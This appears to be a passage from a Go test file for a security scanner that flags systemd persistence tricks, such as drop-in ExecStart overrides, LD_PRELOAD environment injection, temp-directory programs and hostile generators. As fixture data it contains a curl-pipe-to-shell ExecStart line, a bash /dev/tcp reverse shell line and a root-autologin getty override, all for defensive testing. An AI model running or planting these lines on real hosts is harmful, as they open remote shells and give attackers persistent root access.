	h.write("/etc/systemd/system/dangling.service", "[Service]\nEnvironmentFile=/etc/dangling.env\n")
	if err := syscall.Mkfifo(h.root+"/etc/fifo.env", 0o644); err != nil {
		t.Fatal(err)
	}
	h.write("/etc/systemd/system/fifo.service", "[Service]\nEnvironmentFile=/etc/fifo.env\n")

	found := h.scan()
	wantFinding(t, found, "persistence.systemd_env_inject", model.High,
		"plain.service: EnvironmentFile=/etc/app.env: LD_PRELOAD=/opt/evil.so",
		"plain.service: EnvironmentFile=/etc/app.env: LD_AUDIT=/opt/a.so",
		"glob.service: EnvironmentFile=/etc/glob/one.env: LD_AUDIT=/opt/glob.so",
		"h.service: EnvironmentFile=/home/bob/app.env: LD_AUDIT=/opt/home.so")
	wantFinding(t, found, "persistence.systemd_env_temp", model.High,
		"temp.service: EnvironmentFile=/tmp/a.env", "temp2.service: EnvironmentFile=/tmp/b.env",
		"linktemp.service: EnvironmentFile=/etc/to-temp.env -> /tmp/t.env",
		"dangling.service: EnvironmentFile=/etc/dangling.env -> /var/tmp/not-there")
	wantFinding(t, found, "persistence.systemd_env_links", model.Info, "linked.service: EnvironmentFile=/etc/linked.env -> /root/secret.env")
	text := allText(found)
	for _, not := range []string{"hunter2", "APP_CRED", "/commented", "NOT_LD_PRELOAD", "from-a-secret-file", "LD_LIBRARY_PATH =", "stock.service: "} {
		if strings.Contains(text, not) {
			t.Errorf("%q should not be in the report:\n%s", not, text)
		}
	}
}

func TestDropins(t *testing.T) {
	h := newFakeHost(t)
	h.own("/usr/sbin/nginx", "/usr/bin/mawk", "/bin/sh", "/bin/dash")
	h.write("/usr/sbin/nginx", "x")
	h.write("/usr/bin/mawk", "x")
	h.link("/usr/bin/awk", "/usr/bin/mawk")
	h.write("/usr/bin/dash", "x")
	h.link("/bin/sh", "/usr/bin/dash")
	h.write("/tmp/real", "x")
	h.link("/usr/local/bin/to-temp", "/tmp/real")
	// A program given without a path: /usr/local comes first in systemd's search.
	h.write("/usr/local/bin/shadowed", "x")
	h.ownedFile("/usr/sbin/shadowed", "x")
	for _, name := range []string{"nginx", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten"} {
		h.ownedFile("/usr/lib/systemd/system/"+name+".service", "[Service]\nExecStart=/usr/sbin/"+name+" -g 'daemon on;'\n")
	}
	h.ownedFile("/usr/lib/systemd/system/getty@.service", "[Service]\nExecStart=-/sbin/agetty %I\n")

	h.write("/etc/systemd/system/nginx.service.d/override.conf", "[Service]\nExecStart=\nExecStart=/usr/sbin/nginx -c /etc/nginx/mine.conf\n")
	h.write("/etc/systemd/system/two.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/opt/evil/two\n")
	h.write("/run/systemd/system/three.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/tmp/three\n")
	h.write("/etc/systemd/system/four.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/bin/sh -c \"curl -s http://x.example/a | sh\"\n")
	h.write("/etc/systemd/system/five.service.d/alias.conf", "[Service]\nExecStart=\nExecStart=/usr/bin/awk 1\n")
	h.write("/etc/systemd/system/six.service.d/wrapped.conf", "[Service]\nExecStart=\nExecStart=/bin/sh -c '/opt/evil/six'\n")
	h.write("/etc/systemd/system/seven.service.d/link.conf", "[Service]\nExecStart=\nExecStart=/usr/local/bin/to-temp\n")
	h.write("/etc/systemd/system/eight.service.d/bare.conf", "[Service]\nExecStart=\nExecStart=nginx -g x\n")
	h.write("/etc/systemd/system/ten.service.d/shadowed.conf", "[Service]\nExecStart=\nExecStart=shadowed -v\n")
	h.write("/etc/systemd/system/getty@tty1.service.d/autologin.conf", "[Service]\nExecStart=\nExecStart=-/opt/evil/agetty --autologin root\n")

	// Not findings: nothing replaced, a packaged drop-in, an unpackaged unit.
	h.write("/etc/systemd/system/nine.service.d/limits.conf", "[Service]\nLimitNOFILE=4096\nExecStart=\n")
	h.ownedFile("/etc/systemd/system/nine.service.d/packaged.conf", "[Service]\nExecStart=\nExecStart=/opt/packaged-dropin\n")
	h.write("/etc/systemd/system/custom.service", "[Service]\nExecStart=/opt/custom\n")
	h.write("/etc/systemd/system/custom.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/opt/custom2\n")

	found := h.scan()
	wantFinding(t, found, "persistence.systemd_dropin_package", model.Medium,
		"/etc/systemd/system/nginx.service.d/override.conf changes nginx.service. Original ExecStart: /usr/sbin/nginx -g 'daemon on;'. New ExecStart: /usr/sbin/nginx -c /etc/nginx/mine.conf",
		"five.service.d/alias.conf", "eight.service.d/bare.conf")
	wantFinding(t, found, "persistence.systemd_dropin_unowned", model.High,
		"/etc/systemd/system/two.service.d/x.conf changes two.service. Original ExecStart: /usr/sbin/two -g 'daemon on;'. New ExecStart: /opt/evil/two",
		"six.service.d/wrapped.conf", "ten.service.d/shadowed.conf",
		"getty@tty1.service.d/autologin.conf changes getty@tty1.service. Original ExecStart: /sbin/agetty %I. New ExecStart: /opt/evil/agetty --autologin root")
	wantFinding(t, found, "persistence.systemd_dropin_malicious", model.Critical,
		"/run/systemd/system/three.service.d/x.conf changes three.service. Original ExecStart: /usr/sbin/three -g 'daemon on;'. New ExecStart: /tmp/three (runs a program from a temp directory: /tmp/three)",
		"four.service.d/x.conf", "downloads and pipes into a shell",
		"seven.service.d/link.conf", "/tmp/real")

	// Each is reported once, in the drop-in finding with its before and after.
	wantNoFinding(t, found, "persistence.systemd_temp")
	wantNoFinding(t, found, "persistence.systemd_malicious")
	text := allText(found)
	for _, not := range []string{"nine.service", "custom.service.d/x.conf changes", "packaged-dropin"} {
		if strings.Contains(text, not) {
			t.Errorf("%q should not be reported:\n%s", not, text)
		}
	}
	if f := findingByID(found, "persistence.systemd_unowned"); f != nil {
		joined := strings.Join(f.Evidence, "\n")
		if strings.Contains(joined, "two.service.d") {
			t.Errorf("a rated drop-in was listed again: %s", joined)
		}
		if !strings.Contains(joined, "custom.service.d/x.conf -> /opt/custom2") {
			t.Errorf("a drop-in on an unpackaged unit stays in the plain list: %s", joined)
		}
	}
}

func TestDropinOtherExecLinesStayGeneric(t *testing.T) {
	h := newFakeHost(t)
	h.own("/usr/sbin/a")
	h.write("/usr/sbin/a", "x")
	h.ownedFile("/usr/lib/systemd/system/a.service", "[Service]\nExecStart=/usr/sbin/a\n")
	h.write("/etc/systemd/system/a.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/usr/sbin/a -v\nExecStartPre=/tmp/pre\n")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_dropin_package", model.Medium, "/usr/sbin/a -v")
	wantFinding(t, found, "persistence.systemd_temp", model.Critical, "x.conf: /tmp/pre")
}

func TestDropinOnAliasAndLinkedDropin(t *testing.T) {
	h := newFakeHost(t)
	h.ownedFile("/usr/lib/systemd/system/ssh.service", "[Service]\nExecStart=/usr/sbin/sshd -D\n")
	h.link("/etc/systemd/system/sshd.service", "/usr/lib/systemd/system/ssh.service")
	h.write("/etc/systemd/system/sshd.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/opt/evil/sshd\n")
	h.ownedFile("/usr/lib/systemd/system/b.service", "[Service]\nExecStart=/usr/sbin/b\n")
	h.write("/etc/systemd/shared.conf", "[Service]\nExecStart=\nExecStart=/opt/evil/b\n")
	h.link("/etc/systemd/system/b.service.d/linked.conf", "/etc/systemd/shared.conf")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_dropin_unowned", model.High,
		"sshd.service.d/x.conf changes sshd.service. Original ExecStart: /usr/sbin/sshd -D",
		"b.service.d/linked.conf changes b.service")
}

func TestDropinOnMaskedOrCopiedUnit(t *testing.T) {
	h := newFakeHost(t)
	h.ownedFile("/usr/lib/systemd/system/copied.service", "[Service]\nExecStart=/usr/sbin/a\n")
	h.write("/etc/systemd/system/copied.service", "[Service]\nExecStart=/opt/copy\n")
	h.write("/etc/systemd/system/copied.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/opt/evil/a\n")
	found := h.scan()
	wantNoFinding(t, found, "persistence.systemd_dropin_unowned")
	wantFinding(t, found, "persistence.systemd_unowned", model.Info, "copied.service.d/x.conf -> /opt/evil/a")
}

func TestNetplanWaitOnlineIsExpected(t *testing.T) {
	stock := "[Service]\nExecStart=\nExecStart=/lib/systemd/systemd-networkd-wait-online -i eth0:degraded\nExecStart=/lib/systemd/systemd-networkd-wait-online --any -o routable -i eth0\n"
	setup := func(t *testing.T, path, body string) []model.Finding {
		h := newFakeHost(t)
		h.ownedFile("/usr/lib/systemd/systemd-networkd-wait-online", "x")
		h.ownedFile("/usr/lib/systemd/system/systemd-networkd-wait-online.service", "[Service]\nExecStart=/lib/systemd/systemd-networkd-wait-online\n")
		h.write("/usr/bin/other", "x")
		h.own("/usr/bin/other")
		h.link("/lib", "/usr/lib")
		h.write(path, body)
		return h.scan()
	}
	dropin := "/run/systemd/system/systemd-networkd-wait-online.service.d/10-netplan.conf"
	if f := findingByID(setup(t, dropin, stock), "persistence.systemd_dropin_package"); f != nil {
		t.Errorf("netplan's own drop-in was reported: %v", f.Evidence)
	}
	// Anything else at that path, or the same content elsewhere, still counts.
	wantFinding(t, setup(t, dropin, "[Service]\nExecStart=\nExecStart=/usr/bin/other\n"), "persistence.systemd_dropin_package", model.Medium, "/usr/bin/other")
	wantFinding(t, setup(t, dropin, "[Service]\nExecStart=\nExecStart=/opt/systemd-networkd-wait-online\n"), "persistence.systemd_dropin_unowned", model.High)
	wantFinding(t, setup(t, dropin, "[Service]\nExecStart=\nExecStart=/tmp/systemd-networkd-wait-online\n"), "persistence.systemd_dropin_malicious", model.Critical)
	other := "/etc/systemd/system/systemd-networkd-wait-online.service.d/10-netplan.conf"
	wantFinding(t, setup(t, other, stock), "persistence.systemd_dropin_package", model.Medium)
}

func TestTruncatedFiles(t *testing.T) {
	h := newFakeHost(t)
	padding := strings.Repeat("# padding padding\n", persistLimit/10)
	h.write("/etc/systemd/system/big.service", padding+"[Service]\nExecStart=/tmp/hidden\n")
	h.write("/etc/systemd/system-generators/big", padding+"bash -i >& /dev/tcp/1.2.3.4/1 0>&1\n")
	h.write("/etc/big.env", padding+"LD_PRELOAD=/opt/x.so\n")
	h.write("/etc/systemd/system/env.service", "[Service]\nEnvironmentFile=/etc/big.env\n")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_truncated", model.Medium, "/etc/systemd/system/big.service", "/etc/systemd/system-generators/big", "/etc/big.env")
}

func TestOwnersUnavailable(t *testing.T) {
	h := newFakeHost(t)
	h.write("/usr/lib/systemd/system-generators/stock", "x")
	h.write("/usr/lib/systemd/system-generators/bad", "bash -i >& /dev/tcp/1.2.3.4/1 0>&1\n")
	h.write("/usr/lib/systemd/system/a.service", "[Service]\nExecStart=/usr/sbin/a\n")
	h.write("/etc/systemd/system/a.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/tmp/x\n")
	s := newSystemdScan(context.Background(), func(string) bool { return false }, nil, nil)
	s.root = h.root
	s.ownersErr = os.ErrNotExist
	found := s.run()
	wantNoFinding(t, found, "persistence.systemd_generator_unowned")
	wantNoFinding(t, found, "persistence.systemd_unowned")
	wantNoFinding(t, found, "persistence.systemd_dropin_unowned")
	wantFinding(t, found, "persistence.systemd_generator_malicious", model.Critical, "bad")
	wantFinding(t, found, "persistence.systemd_temp", model.Critical, "x.conf: /tmp/x")
	wantFinding(t, found, "persistence.systemd_owners", model.Skipped)
}

func TestCleanHost(t *testing.T) {
	h := newFakeHost(t)
	h.ownedFile("/usr/lib/systemd/system-generators/stock", "x")
	h.ownedFile("/usr/lib/systemd/system/a.service", "[Service]\nExecStart=/usr/sbin/a\n")
	found := h.scan()
	if len(found) != 1 || found[0].ID != "persistence.systemd_clean" {
		t.Fatalf("got %v", ids(found))
	}
	if !strings.Contains(found[0].Title, "Scanned 2 ") {
		t.Errorf("count: %s", found[0].Title)
	}
}

func TestMediumOnlyStaysClean(t *testing.T) {
	h := newFakeHost(t)
	h.own("/usr/sbin/a")
	h.write("/usr/sbin/a", "x")
	h.ownedFile("/usr/lib/systemd/system/a.service", "[Service]\nExecStart=/usr/sbin/a\n")
	h.write("/etc/systemd/system/a.service.d/x.conf", "[Service]\nExecStart=\nExecStart=/usr/sbin/a -v\n")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_dropin_package", model.Medium)
	wantFinding(t, found, "persistence.systemd_clean", model.OK)
	h.write("/etc/systemd/system-generators/x", "x")
	wantNoFinding(t, h.scan(), "persistence.systemd_clean")
}

func TestScanStopsWhenCancelled(t *testing.T) {
	h := newFakeHost(t)
	h.write("/etc/systemd/system/a.service", "[Service]\nExecStart=/tmp/a\n")
	h.write("/etc/systemd/system-generators/x", "x")
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	s := newSystemdScan(ctx, func(string) bool { return false }, nil, nil)
	s.root = h.root
	found := s.run()
	wantNoFinding(t, found, "persistence.systemd_temp")
	wantNoFinding(t, found, "persistence.systemd_generator_unowned")
}

func TestDropinUnit(t *testing.T) {
	cases := []struct {
		path, unit string
		ok         bool
	}{
		{"/etc/systemd/system/nginx.service.d/x.conf", "nginx.service", true},
		{"/run/systemd/system/nginx.service.d/x.conf", "nginx.service", true},
		{"/etc/systemd/system/getty@tty1.service.d/x.conf", "getty@tty1.service", true},
		{"/etc/systemd/system/service.d/x.conf", "", false},
		{"/etc/systemd/system/nginx.service.d/x.txt", "", false},
		{"/etc/systemd/system/nginx.service.d/sub/x.conf", "", false},
		{"/usr/lib/systemd/system/nginx.service.d/x.conf", "", false},
		{"/etc/systemd/user/nginx.service.d/x.conf", "", false},
		{"/etc/systemd/system/nginx.service", "", false},
	}
	for _, c := range cases {
		unit, ok := dropinUnit(c.path)
		if unit != c.unit || ok != c.ok {
			t.Errorf("%s: got %q %v", c.path, unit, ok)
		}
	}
}

func TestTemplateOf(t *testing.T) {
	cases := map[string]string{
		"getty@tty1.service": "getty@.service",
		"getty@.service":     "",
		"nginx.service":      "",
	}
	for in, want := range cases {
		if got := templateOf(in); got != want {
			t.Errorf("%s: got %q, want %q", in, got, want)
		}
	}
}

func TestIsSystemdPathIncludesRuntimeDirs(t *testing.T) {
	for _, p := range []string{"/run/systemd/generator/a.service", "/run/systemd/generator.late/a.service", "/run/systemd/transient/a.service", "/lib/systemd/system/a.service", "/etc/xdg/systemd/user/a.service"} {
		if !isSystemdPath(p) {
			t.Errorf("%s should count", p)
		}
	}
	if isSystemdPath("/opt/a.service") {
		t.Error("/opt should not count")
	}
}
